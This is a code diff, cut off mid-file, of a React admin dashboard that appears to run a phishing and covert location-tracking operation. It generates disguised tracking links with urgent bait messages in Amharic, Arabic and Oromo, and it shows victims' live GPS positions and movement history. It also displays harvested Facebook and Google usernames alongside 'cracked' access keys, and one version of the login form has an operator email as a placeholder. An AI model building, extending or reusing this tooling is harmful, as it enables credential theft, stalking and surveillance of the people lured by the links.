@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Target, Shield, Map as MapIcon, Users, Settings, Activity, Signal, Navigation, Link as LinkIcon, Globe, AlertTriangle } from 'lucide-react';
+import { Target, Shield, Map as MapIcon, Users, Settings, Activity, Signal, Navigation, Link as LinkIcon, Globe, AlertTriangle, Radar, LogOut, ChevronLeft, ChevronRight, Share2, Lock } from 'lucide-react';
 import { IntelligenceMap } from './IntelligenceMap';
 import { db, auth, onSnapshot, collection, OperationType, handleFirestoreError, signInAnonymously, GoogleAuthProvider, signInWithPopup, signInWithEmailAndPassword } from '../lib/firebase';
 import { motion, AnimatePresence } from 'motion/react';
@@ -17,12 +17,204 @@ interface TargetData {
   intel?: { platform: string, user: string, key: string, timestamp: string }[];
 }
 
+// --- Subcomponents ---
+
+const NavIcon = ({ active, icon, label, onClick }: any) => (
+  <button 
+    onClick={onClick}
+    className={`group relative p-3 rounded-xl transition-all ${active ? 'bg-blue-600/10 text-blue-500 shadow-[inset_0_0_10px_rgba(37,99,235,0.1)]' : 'text-slate-600 hover:text-slate-400'}`}
+  >
+    {icon}
+    <div className="absolute left-full ml-4 px-2 py-1 bg-slate-900 text-white text-[10px] font-bold uppercase tracking-widest rounded border border-slate-800 opacity-0 group-hover:opacity-100 pointer-events-none transition-opacity whitespace-nowrap z-[100]">
+      {label}
+    </div>
+    {active && <div className="absolute left-0 top-1/4 bottom-1/4 w-[2px] bg-blue-500 rounded-full"></div>}
+  </button>
+);
+
+const TargetCard = ({ target, selected, onClick }: { target: TargetData, selected: boolean, onClick: () => void }) => (
+  <div 
+    onClick={onClick}
+    className={`group p-3 rounded-xl border cursor-pointer transition-all duration-300 ${selected ? 'bg-blue-600/10 border-blue-500/30' : 'bg-slate-900/30 border-slate-800/50 hover:bg-slate-900/60 hover:border-slate-700'}`}
+  >
+    <div className="flex items-center justify-between mb-2">
+      <div className="flex items-center gap-2">
+         <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500 shadow-[0_0_8px_#10b981] animate-pulse' : 'bg-slate-700'}`} />
+         <span className={`text-[10px] font-black uppercase tracking-widest ${selected ? 'text-blue-400' : 'text-slate-500 group-hover:text-slate-400'}`}>Target_{target.id.slice(0, 4)}</span>
+      </div>
+      <span className="text-[9px] text-slate-600 font-mono">{new Date(target.lastSeen).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
+    </div>
+    <div className="flex items-center justify-between gap-4">
+      <span className={`text-[11px] font-bold truncate ${selected ? 'text-white' : 'text-slate-400 group-hover:text-slate-300'}`}>{target.name}</span>
+      {target.intel && target.intel.length > 0 && (
+         <div className="bg-red-500/20 text-red-500 text-[8px] font-black px-1.5 rounded animate-pulse">INTEL</div>
+      )}
+    </div>
+  </div>
+);
+
+const FolderItem = ({ name, targets, selectedId, onSelect }: any) => {
+  const containsSelected = targets.some((t: any) => t.id === selectedId);
+  return (
+    <div className="space-y-1">
+      <div className="flex items-center gap-2 px-2 py-1.5">
+         <Users className="w-3 h-3 text-slate-600" />
+         <span className="text-[9px] font-black text-slate-600 uppercase tracking-widest">{name}</span>
+         <span className="text-[7px] text-slate-800 font-mono ml-auto">{targets.length} UNITS</span>
+      </div>
+      <div className="pl-3 border-l border-slate-800/50 ml-1 space-y-1">
+         {targets.map((t: any) => (
+           <div 
+             key={t.id}
+             onClick={() => onSelect(t.id)}
+             className={`px-3 py-2 text-[10px] rounded cursor-pointer transition-all ${selectedId === t.id ? 'bg-blue-600/10 text-blue-400 font-bold' : 'text-slate-500 hover:text-slate-400'}`}
+           >
+             T-{t.id.slice(0, 6)}
+           </div>
+         ))}
+      </div>
+    </div>
+  );
+};
+
+const Stat = ({ label, value, color }: any) => (
+  <div className="flex flex-col">
+    <span className="text-[8px] text-slate-600 uppercase font-bold tracking-widest mb-0.5">{label}</span>
+    <span className={`text-[12px] font-black tracking-tight ${color || 'text-white'}`}>{value}</span>
+  </div>
+);
+
+const TelemetryBlock = ({ target, historyIndex }: any) => {
+  const currentPos = target.history && historyIndex >= 0 && historyIndex < target.history.length ? target.history[historyIndex] : target;
+  return (
+    <div className="bg-[#0a0c12]/95 backdrop-blur-md border border-slate-800 p-5 rounded-2xl shadow-2xl space-y-6">
+      <div className="flex justify-between items-center text-slate-500">
+        <span className="text-[10px] font-bold uppercase tracking-widest">Real-time Telemetry</span>
+        <div className="flex items-center gap-1">
+           <Activity className="w-3 h-3 text-emerald-500" />
+           <span className="text-[10px] font-mono text-emerald-500 animate-pulse">LIVE_SYNC</span>
+        </div>
+      </div>
+      
+      <div className="space-y-1">
+        <div className="text-4xl font-mono text-emerald-400 font-bold tracking-tighter tabular-nums drop-shadow-[0_0_10px_#10b98133]">
+           {currentPos.lat.toFixed(6)}°N
+        </div>
+        <div className="text-4xl font-mono text-emerald-400 font-bold tracking-tighter tabular-nums drop-shadow-[0_0_10px_#10b98133]">
+           {currentPos.lng.toFixed(6)}°E
+        </div>
+      </div>
+
+      <div className="grid grid-cols-2 gap-2 pt-2">
+         <div className="bg-black/50 p-2 rounded-lg border border-slate-800">
+            <span className="text-[8px] text-slate-600 block mb-1 uppercase font-black">Satellite Fix</span>
+            <span className="text-[11px] font-mono font-bold text-slate-300">GEO_STATIONARY_{Math.random().toString(36).substring(7).toUpperCase()}</span>
+         </div>
+         <div className="bg-black/50 p-2 rounded-lg border border-slate-800">
+            <span className="text-[8px] text-slate-600 block mb-1 uppercase font-black">Accuracy_Index</span>
+            <span className="text-[11px] font-mono font-bold text-blue-400">±{target.accuracy?.toFixed(1) || '0.0'} METERS</span>
+         </div>
+      </div>
+    </div>
+  );
+};
+
+const PlaybackControls = ({ target, currentIndex, onChange }: any) => {
+  if (!target.history || target.history.length <= 1) return null;
+  return (
+    <div className="bg-[#0a0c12]/95 backdrop-blur-md border border-slate-800 p-5 rounded-2xl shadow-2xl space-y-4">
+      <div className="flex justify-between items-center">
+        <span className="text-[10px] text-slate-500 uppercase font-black tracking-widest">History Playback</span>
+        <span className="text-[11px] font-mono text-blue-400 bg-blue-500/10 px-2 rounded">TRACK_LOG_{currentIndex + 1}</span>
+      </div>
+      
+      <input 
+        type="range"
+        min="0"
+        max={target.history.length - 1}
+        value={currentIndex}
+        onChange={(e) => onChange(parseInt(e.target.value))}
+        className="w-full h-1 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-blue-500"
+      />
+
+      <div className="flex gap-2">
+         <button 
+           disabled={currentIndex === 0}
+           onClick={() => onChange(currentIndex - 1)}
+           className="flex-1 py-1 px-3 rounded bg-slate-800 text-[9px] font-black hover:bg-slate-700 transition-colors uppercase disabled:opacity-20"
+         >
+           Previous
+         </button>
+         <button 
+           disabled={currentIndex === target.history.length - 1}
+           onClick={() => onChange(currentIndex + 1)}
+           className="flex-1 py-1 px-3 rounded bg-blue-600 text-[9px] font-black hover:bg-blue-500 transition-colors uppercase disabled:opacity-20"
+         >
+           Advance
+         </button>
+      </div>
+
+      <div className="text-center pt-2">
+         <span className="text-[10px] text-slate-600 font-mono italic">
+           Sync Time: {new Date(target.history[currentIndex].time).toLocaleString()}
+         </span>
+      </div>
+    </div>
+  );
+};
+
+const IntelCard = ({ targetName, intel }: any) => {
+  const Icon = intel.platform === 'Facebook' ? Users : intel.platform === 'Google' ? Globe : Activity;
+  const color = intel.platform === 'Facebook' ? 'text-blue-500' : intel.platform === 'Google' ? 'text-red-500' : 'text-sky-400';
+  
+  return (
+    <motion.div 
+      initial={{ opacity: 0, scale: 0.98 }}
+      animate={{ opacity: 1, scale: 1 }}
+      className="bg-[#0a0c12] border border-slate-800 rounded-2xl overflow-hidden shadow-xl group hover:border-red-500/30 transition-all"
+    >
+      <div className="bg-black/40 p-4 border-b border-slate-800 flex justify-between items-center">
+         <div className="flex items-center gap-3">
+            <div className={`p-2 bg-slate-900 rounded-lg ${color}`}>
+               <Icon className="w-4 h-4" />
+            </div>
+            <div className="flex flex-col">
+               <span className={`text-[10px] font-black uppercase tracking-widest ${color}`}>{intel.platform} Harvest</span>
+               <span className="text-xs font-bold text-white uppercase">{targetName}</span>
+            </div>
+         </div>
+         <span className="text-[9px] font-mono text-slate-600">{new Date(intel.timestamp).toLocaleTimeString()}</span>
+      </div>
+      <div className="p-6 space-y-4">
+         <div className="space-y-1">
+            <span className="text-[8px] text-slate-600 uppercase font-black tracking-widest">Intercepted Identify</span>
+            <div className="bg-black border border-slate-800 p-3 rounded-xl font-mono text-xs text-slate-300 break-all select-all flex items-center justify-between group-hover:border-slate-700">
+               {intel.user}
+               <Share2 className="w-3 h-3 text-slate-700 opacity-0 group-hover:opacity-100 transition-opacity" />
+            </div>
+         </div>
+         <div className="space-y-1">
+            <span className="text-[8px] text-slate-600 uppercase font-black tracking-widest">Access Key (CRACKED)</span>
+            <div className="bg-red-500/5 border border-red-500/20 p-3 rounded-xl font-mono text-xs text-red-500 font-bold select-all flex items-center justify-between group-hover:border-red-500/40">
+               {intel.key}
+               <Lock className="w-3 h-3 opacity-30" />
+            </div>
+         </div>
+      </div>
+      <div className="px-6 py-3 bg-red-500/5 text-[9px] text-red-500/60 font-black italic uppercase tracking-widest animate-pulse">
+        Encrypted Stream Intercepted Successfully
+      </div>
+    </motion.div>
+  );
+};
 export const AdminDashboard: React.FC = () => {
   const [targets, setTargets] = useState<TargetData[]>([]);
   const [selectedTargetId, setSelectedTargetId] = useState<string | undefined>();
   const [selectedLanguage, setSelectedLanguage] = useState<'amharic' | 'arabic' | 'oromo' | 'both'>('amharic');
   const [activeTab, setActiveTab] = useState<'all' | 'folders'>('all');
   const [historyIndex, setHistoryIndex] = useState(0);
+  const [currentView, setCurrentView] = useState<'map' | 'intel' | 'settings'>('map');
+  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
   
   const translations = {
     amharic: "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።",
@@ -143,7 +335,19 @@ export const AdminDashboard: React.FC = () => {
           intel: data.intel
         });
       });
+      
       setTargets(targetList);
+
+      // AUTOMATIC LIVE TRACKING: Jump to the latest transmitting signal
+      if (targetList.length > 0) {
+        const latest = [...targetList].sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime())[0];
+        const isFresh = new Date().getTime() - new Date(latest.lastSeen).getTime() < 10000;
+
+        if (!selectedTargetId || (latest.id !== selectedTargetId && isFresh)) {
+          setSelectedTargetId(latest.id);
+          setHistoryIndex(latest.history ? latest.history.length - 1 : 0);
+        }
+      }
     }, (error) => {
       // Gracefully handle permission errors if not admin yet
       if (error.message.includes('permission-denied')) {
@@ -161,7 +365,7 @@ export const AdminDashboard: React.FC = () => {
   const deployLink = () => {
     const langParam = selectedLanguage === 'both' ? 'both' : selectedLanguage;
     const nameParam = targetLabel ? `&n=${encodeURIComponent(targetLabel)}` : '';
-    const url = `${window.location.origin}/v?lang=${langParam}${nameParam}`;
+    const url = `${window.location.origin}/track?lang=${langParam}${nameParam}`;
     navigator.clipboard.writeText(url);
     setCopyStatus('copied');
     setTimeout(() => setCopyStatus('idle'), 3000);
@@ -177,482 +381,299 @@ export const AdminDashboard: React.FC = () => {
     return acc;
   }, {} as Record<string, TargetData[]>);
 
+  if (!isAdminAuthenticated) {
+    return (
+      <div className="min-h-screen bg-[#050608] flex items-center justify-center p-4">
+        <motion.div 
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="max-w-sm w-full bg-slate-900/50 border border-slate-800 p-8 rounded-2xl text-center space-y-6"
+        >
+          <div className="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mx-auto">
+            <Lock className="text-blue-500" />
+          </div>
+          <h2 className="text-xl font-bold text-white tracking-widest uppercase">Admin Access Restricted</h2>
+          <div className="space-y-4">
+            <input 
+              type="email" 
+              placeholder="Operator Email"
+              value={loginForm.email}
+              onChange={(e) => setLoginForm(p => ({...p, email:e.target.value}))}
+              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-sm"
+            />
+            <input 
+              type="password" 
+              placeholder="Access Key"
+              value={loginForm.password}
+              onChange={(e) => setLoginForm(p => ({...p, password:e.target.value}))}
+              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-sm"
+            />
+            <button 
+              onClick={handleAdminLogin}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded"
+            >
+              {isLoggingIn ? 'Verifying...' : 'Login'}
+            </button>
+          </div>
+          <div className="relative py-2 flex items-center">
+            <div className="flex-1 border-t border-slate-800"></div>
+            <span className="px-2 text-[8px] text-slate-600 uppercase">OR</span>
+            <div className="flex-1 border-t border-slate-800"></div>
+          </div>
+          <button 
+            onClick={handleGoogleLogin}
+            className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2"
+          >
+            <Globe className="w-4 h-4" /> Google Identification
+          </button>
+          {errorMsg && <p className="text-red-500 text-[10px] font-mono whitespace-pre-wrap">{errorMsg}</p>}
+        </motion.div>
+      </div>
+    );
+  }
+
   return (
-    <div className="bg-[#050608] text-slate-300 font-sans h-screen flex flex-col border-4 border-[#1a1c23] overflow-hidden">
-      {/* Header */}
-      <header className="h-16 border-b border-slate-800 bg-[#0a0c12] flex items-center justify-between px-6 shrink-0 shadow-lg">
-        <div className="flex items-center gap-3">
-          <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse shadow-[0_0_10px_rgba(239,68,68,0.8)]"></div>
-          <h1 className="text-xs font-mono tracking-[0.3em] text-slate-400 uppercase font-bold">Strategic Intelligence & Terrain Surveillance v8.4.2</h1>
+    <div className="flex h-screen bg-[#020305] text-slate-300 font-sans overflow-hidden">
+      
+      {/* 1. Global Navigation Sidebar */}
+      <aside className="w-16 flex flex-col items-center py-6 bg-[#0a0c12] border-r border-slate-800/50 z-50">
+        <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center mb-10 shadow-[0_0_15px_rgba(37,99,235,0.4)]">
+          <Radar className="text-white w-6 h-6 animate-pulse" />
         </div>
-        <div className="flex gap-6 text-[10px] font-mono">
-          <div className="text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">SECURE CONNECTION: ACTIVE</div>
-          <div className="text-slate-500 uppercase flex items-center gap-2">
-            <Globe className="w-3 h-3" />
-            Sector 7 / HQ
-          </div>
-          <div className="text-slate-500 border-l border-slate-800 pl-6">{isClient ? time : '--:--:--'}</div>
-        </div>
-      </header>
-
-      <main className="flex-1 flex overflow-hidden">
-        {/* Left Sidebar: Target Link Engine */}
-        <aside className="w-72 border-r border-slate-800 bg-[#07090e] p-4 flex flex-col gap-4 shrink-0 overflow-y-auto shadow-2xl">
-          <div className="space-y-1">
-            <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-1">Target Link Engine</label>
-            <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-4 space-y-4 shadow-inner">
-              <div className="space-y-1">
-                <div className="text-[9px] text-slate-500 uppercase font-bold">Transmission Language</div>
-                <div className="flex gap-1">
-                  {(['amharic', 'arabic', 'oromo', 'both'] as const).map(lang => (
-                    <button
-                      key={lang}
-                      onClick={() => setSelectedLanguage(lang)}
-                      className={`flex-1 text-[8px] py-1 rounded border uppercase font-bold transition-all ${
-                        selectedLanguage === lang 
-                          ? 'bg-blue-600 border-blue-500 text-white' 
-                          : 'bg-slate-900 border-slate-700 text-slate-500'
-                      }`}
-                    >
-                      {lang}
-                    </button>
-                  ))}
-                </div>
-              </div>
-              <div className="space-y-1">
-                <div className="text-[9px] text-slate-500 uppercase font-bold">Target Identifier (Optional)</div>
-                <input 
-                  type="text"
-                  value={targetLabel}
-                  onChange={(e) => setTargetLabel(e.target.value)}
-                  placeholder="e.g. Asset_X_2024"
-                  className="w-full bg-slate-900 border border-slate-700 text-[11px] p-2 rounded text-slate-300 focus:border-blue-500 outline-none transition-colors"
-                />
-              </div>
-              <div className="space-y-1">
-                <div className="text-[9px] text-slate-500 uppercase font-bold">Select Bait Template</div>
-                <select className="w-full bg-slate-900 border border-slate-700 text-[11px] p-2 rounded text-slate-300 focus:border-blue-500 outline-none transition-colors cursor-pointer">
-                  <option>Urgent Security Update (Recommended)</option>
-                  <option>Exclusive Content Reward</option>
-                  <option>System Alert Notification</option>
-                </select>
-              </div>
-              <div className="space-y-1">
-                <div className="text-[9px] text-slate-500 uppercase font-bold">Bait Preview ({selectedLanguage.toUpperCase()})</div>
-                <div className="bg-slate-950 p-3 border border-slate-800 rounded-lg shadow-inner max-h-32 overflow-y-auto custom-scrollbar">
-                  {(selectedLanguage === 'amharic' || selectedLanguage === 'both') && (
-                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic mb-2">
-                      "{translations.amharic}"
-                    </p>
-                  )}
-                  {(selectedLanguage === 'arabic' || selectedLanguage === 'both') && (
-                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic dir-rtl text-right mb-2">
-                       "{translations.arabic}"
-                    </p>
-                  )}
-                  {(selectedLanguage === 'oromo' || selectedLanguage === 'both') && (
-                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic mb-2">
-                       "{translations.oromo}"
-                    </p>
-                  )}
-                  <div className="mt-2 text-center text-blue-500 font-mono font-black text-lg tracking-[0.3em]">8429</div>
-                </div>
-              </div>
-              <button 
-                onClick={deployLink}
-                className={`w-full text-white text-[11px] py-2.5 rounded font-bold transition-all shadow-lg flex items-center justify-center gap-2 uppercase tracking-widest active:scale-95 ${
-                  copyStatus === 'copied' ? 'bg-emerald-600' : 'bg-blue-600 hover:bg-blue-500'
-                }`}
-              >
-                {copyStatus === 'copied' ? <Shield className="w-3.5 h-3.5" /> : <LinkIcon className="w-3.5 h-3.5" />}
-                {copyStatus === 'copied' ? 'LINK COPIED' : 'GENERATE TRACKING LINK'}
-              </button>
-            </div>
-          </div>
-
-          <div className="flex-1 flex flex-col gap-2 overflow-hidden">
-            <div className="flex justify-between items-center px-1">
-              <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest">Intelligence Feed</label>
-                <div className="flex bg-slate-900 rounded p-1 border border-slate-800">
-                <button 
-                  onClick={() => setActiveTab('all')}
-                  className={`px-4 py-1.5 text-[10px] rounded uppercase font-black transition-all ${activeTab === 'all' ? 'bg-blue-600 text-white shadow-lg' : 'text-slate-500 hover:text-slate-300'}`}
-                >
-                  Live Feed
-                </button>
-                <button 
-                  onClick={() => setActiveTab('folders')}
-                  className={`px-4 py-1.5 text-[10px] rounded uppercase font-black transition-all ${activeTab === 'folders' ? 'bg-blue-600 text-white shadow-lg' : 'text-slate-500 hover:text-slate-300'}`}
-                >
-                  Folders
-                </button>
-              </div>
-            </div>
-            <div className="flex-1 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
-              {errorMsg && (
-                <div className="p-3 border border-red-500/30 bg-red-500/5 rounded text-[10px] font-mono text-red-500 leading-relaxed uppercase flex flex-col gap-3">
-                  <div className="flex items-center gap-2">
-                    <AlertTriangle className="w-3 h-3" />
-                    <span>Authentication Failure</span>
-                  </div>
-                  <p className="text-[9px] opacity-70 italic lowercase normal-case">{errorMsg}</p>
-                </div>
-              )}
-
-              {!isAdminAuthenticated && (
-                <div className="p-4 bg-slate-900/50 border border-slate-800 rounded-lg space-y-4">
-                  <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest text-center border-b border-slate-800 pb-2 mb-2">Operator Login</div>
-                  <div className="space-y-3">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-slate-500 uppercase">Email</label>
-                      <input 
-                        type="email" 
-                        value={loginForm.email}
-                        onChange={(e) => setLoginForm(prev => ({ ...prev, email: e.target.value }))}
-                        placeholder="sendeqbuild@gmail.com"
-                        className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-[11px] text-slate-300 outline-none focus:border-blue-500"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-slate-500 uppercase">Access Code</label>
-                      <input 
-                        type="password" 
-                        value={loginForm.password}
-                        onChange={(e) => setLoginForm(prev => ({ ...prev, password: e.target.value }))}
-                        placeholder="••••••••"
-                        autoComplete="current-password"
-                        className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-[11px] text-slate-300 outline-none focus:border-blue-500"
-                      />
-                    </div>
-                    <button 
-                      onClick={handleAdminLogin}
-                      disabled={isLoggingIn}
-                      className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white rounded font-bold transition-all text-[10px] uppercase shadow-lg shadow-blue-900/20 disabled:opacity-50"
-                    >
-                      {isLoggingIn ? 'Verifying...' : 'Authenticate'}
-                    </button>
-                    <div className="relative py-2 flex items-center">
-                      <div className="flex-1 border-t border-slate-800"></div>
-                      <span className="px-2 text-[8px] text-slate-600 uppercase">OR</span>
-                      <div className="flex-1 border-t border-slate-800"></div>
-                    </div>
-                    <button 
-                      onClick={handleGoogleLogin}
-                      className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 rounded font-bold transition-all text-[10px] flex items-center justify-center gap-2"
-                    >
-                      <Globe className="w-3 h-3" />
-                      SIGN IN WITH GOOGLE
-                    </button>
-                  </div>
-                </div>
-              )}
-
-              {isAdminAuthenticated && targets.length === 0 ? (
-                <div className="py-20 text-center opacity-20 flex flex-col items-center gap-2">
-                  <Signal className="w-8 h-8" />
-                  <span className="text-[10px] font-mono">AWAITING TRANSMISSIONS...</span>
-                </div>
-              ) : (
-                isAdminAuthenticated && (
-                  activeTab === 'all' ? (
-                    targets.map(target => (
-                      <motion.div 
-                        layout
-                        key={target.id}
-                        onClick={() => setSelectedTargetId(target.id)}
-                        className={`bg-[#0d1117] border-l-4 p-3 cursor-pointer transition-all hover:bg-[#161b22] ${
-                          selectedTargetId === target.id ? 'border-red-500 bg-[#161b22] shadow-[0_0_15px_rgba(239,68,68,0.1)]' : 'border-emerald-500'
-                        }`}
-                      >
-                        <div className="flex justify-between text-[10px] mb-1 font-mono">
-                          <span className={target.status === 'active' ? 'text-emerald-400' : 'text-slate-500'}>
-                            ID: {target.id.slice(0, 10).toUpperCase()}
-                          </span>
-                          <div className="flex gap-2 items-center">
-                            {target.platform && (
-                              <span className="bg-blue-900/40 text-blue-400 px-1.5 py-0.5 rounded-[2px] text-[8px] font-bold border border-blue-500/20">
-                                {target.platform.toUpperCase()}
-                              </span>
-                            )}
-                            <span className="text-slate-500 uppercase font-bold">{target.status}</span>
-                          </div>
-                        </div>
-                        <div className="text-xs font-bold truncate text-slate-200 flex justify-between items-center">
-                          <span>{target.name}</span>
-                          <button 
-                            onClick={(e) => {
-                              e.stopPropagation();
-                              setSelectedTargetId(target.id);
-                              setHistoryIndex(target.history ? target.history.length - 1 : 0);
-                            }}
-                            className="bg-slate-800 hover:bg-slate-700 p-1 rounded text-slate-500 hover:text-emerald-400 transition-colors"
-                          >
-                            <MapIcon className="w-3 h-3" />
-                          </button>
-                        </div>
-                        
-                        {target.intel && target.intel.length > 0 && (
-                          <div className="mt-2 bg-red-500/10 border border-red-500/20 p-1.5 rounded text-[8px] font-mono">
-                            <div className="flex justify-between items-center text-red-500 font-bold mb-0.5">
-                              <span>LAST_INTEL</span>
-                              <Activity className="w-2 h-2 animate-pulse" />
-                            </div>
-                            <div className="truncate text-red-400">
-                              {target.intel[target.intel.length-1].user} : {target.intel[target.intel.length-1].key}
-                            </div>
-                          </div>
-                        )}
-
-                        <div className="text-[9px] text-slate-500 mt-2 font-mono flex justify-between uppercase">
-                          <span>Lat: {target.lat.toFixed(4)}</span>
-                          <span>Lng: {target.lng.toFixed(4)}</span>
-                        </div>
-                      </motion.div>
-                    ))
-                  ) : (
-                    /* Folder Logic: Grouped by Target Name */
-                    Object.entries(groupedTargetsByName).map(([folderName, folderTargets]) => (
-                      <div key={folderName} className="space-y-1 mb-4">
-                        <div className="flex items-center gap-2 px-3 py-1.5 bg-slate-900 rounded border border-slate-800 mb-2 group cursor-pointer hover:bg-slate-800 transition-colors">
-                          <Users className="w-3.5 h-3.5 text-blue-500" />
-                          <span className="text-[10px] font-black text-slate-300 uppercase tracking-widest flex-1">{folderName}</span>
-                          <span className="text-[9px] bg-slate-800 px-1.5 rounded text-slate-500 group-hover:text-blue-400">{folderTargets.length}</span>
-                        </div>
-                        <div className="pl-3 space-y-1.5 border-l-2 border-slate-800/50 ml-3">
-                           {folderTargets.map(target => (
-                             <div 
-                               key={target.id}
-                               onClick={() => {
-                                 setSelectedTargetId(target.id);
-                                 setHistoryIndex(target.history ? target.history.length - 1 : 0);
-                               }}
-                               className={`px-3 py-2 text-[10px] rounded cursor-pointer transition-all ${selectedTargetId === target.id ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/30'}`}
-                             >
-                                <div className="flex items-center gap-2">
-                                  <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]' : 'bg-slate-700'}`}></div>
-                                  <span className="font-mono text-[9px]">{target.id.slice(0, 8).toUpperCase()}</span>
-                                  <span className="opacity-30 text-[8px]">—</span>
-                                  <span className="truncate text-[9px] font-bold opacity-80">{new Date(target.lastSeen).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
-                                  {target.intel && target.intel.length > 0 && (
-                                    <div className="ml-auto w-2 h-2 bg-red-500 rounded-full animate-pulse shadow-[0_0_5px_#ef4444]"></div>
-                                  )}
-                                </div>
-                             </div>
-                           ))}
-                        </div>
-                      </div>
-                    ))
-                  )
-                )
-              )}
-            </div>
-          </div>
-        </aside>
-
-        {/* Center: Map */}
-        <section className="flex-1 relative bg-[#020305] overflow-hidden">
-          <IntelligenceMap 
-            targets={targets.map(t => ({ 
-              id: t.id, 
-              name: t.name, 
-              lat: t.lat, 
-              lng: t.lng, 
-              lastSeen: t.lastSeen,
-              accuracy: t.accuracy,
-              history: t.history
-            }))} 
-            selectedTargetId={selectedTargetId}
-            historyIndex={historyIndex}
+        <div className="flex-1 flex flex-col gap-6">
+          <NavIcon 
+            active={currentView === 'map'} 
+            onClick={() => setCurrentView('map')} 
+            icon={<MapIcon className="w-5 h-5" />} 
+            label="Live Map" 
           />
-
-          {/* Map Overlays */}
-          <div className="absolute top-6 left-6 z-[1000] space-y-3 pointer-events-none">
-            <div className="bg-[#0a0c12]/95 border border-slate-800 p-4 rounded-lg backdrop-blur-md shadow-[0_20px_50px_rgba(0,0,0,0.5)] border-l-4 border-l-emerald-500">
-              <div className="text-[10px] text-slate-500 font-mono underline uppercase tracking-[0.2em] mb-2 opacity-60">Live Telemetry Feed</div>
-              <div className="text-2xl font-mono text-emerald-400 tracking-tighter font-bold">
-                {selectedTarget?.history && historyIndex >= 0 && historyIndex < selectedTarget.history.length 
-                  ? `${selectedTarget.history[historyIndex].lat.toFixed(6)}°N` 
-                  : selectedTarget 
-                    ? `${selectedTarget.lat.toFixed(6)}°N` 
-                    : '0.000000°N'}
-                <br />
-                {selectedTarget?.history && historyIndex >= 0 && historyIndex < selectedTarget.history.length 
-                  ? `${selectedTarget.history[historyIndex].lng.toFixed(6)}°E` 
-                  : selectedTarget 
-                    ? `${selectedTarget.lng.toFixed(6)}°E` 
-                    : '0.000000°E'}
-              </div>
-              <div className="text-[10px] text-slate-400 mt-2 flex items-center gap-2">
-                <Navigation className="w-3 h-3 text-red-500" />
-                Terrain: {selectedTarget ? 'Analyzed via Satellite' : 'Awaiting Signal...'}
-              </div>
-            </div>
-            <div className="flex gap-2">
-              <div className="bg-slate-900/90 border border-slate-700 px-3 py-1.5 rounded-full text-[9px] font-bold shadow-lg flex items-center gap-2">
-                <div className="w-1.5 h-1.5 bg-blue-500 rounded-full"></div>
-                PRECISION: {selectedTarget?.accuracy.toFixed(1) || '0.0'}m
-              </div>
-              <div className="bg-slate-900/90 border border-slate-700 px-3 py-1.5 rounded-full text-[9px] font-bold shadow-lg flex items-center gap-2">
-                <div className={`w-1.5 h-1.5 rounded-full ${selectedTarget ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
-                STATUS: {selectedTarget?.status.toUpperCase() || 'SCANNING'}
-              </div>
-            </div>
-          </div>
-        </section>
-
-        {/* Right Sidebar: Intelligence */}
-        <aside className="w-64 border-l border-slate-800 bg-[#07090e] p-4 shrink-0 flex flex-col gap-6 overflow-y-auto shadow-[-20px_0_50px_rgba(0,0,0,0.5)]">
-          <div className="bg-[#0d1117] border border-slate-800 rounded-lg overflow-hidden shrink-0 shadow-inner">
-            <div className="bg-slate-800/50 p-2 text-[10px] font-bold tracking-widest uppercase border-b border-slate-800">Live Motion Detection</div>
-            <div className="h-32 flex items-center justify-center bg-black relative">
-              <div className="absolute inset-0 bg-green-950/10" style={{ backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(0,255,0,0.03) 1px, rgba(0,255,0,0.03) 2px)', backgroundSize: '100% 2px' }}></div>
-              <div className="text-emerald-500 font-mono text-[9px] animate-pulse flex flex-col items-center gap-2">
-                <Activity className="w-5 h-5 text-emerald-500/50" />
-                <span className="tracking-widest">SCANNING...</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="flex-1 space-y-6">
-            <div className="space-y-2">
-              <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Environmental Intel</div>
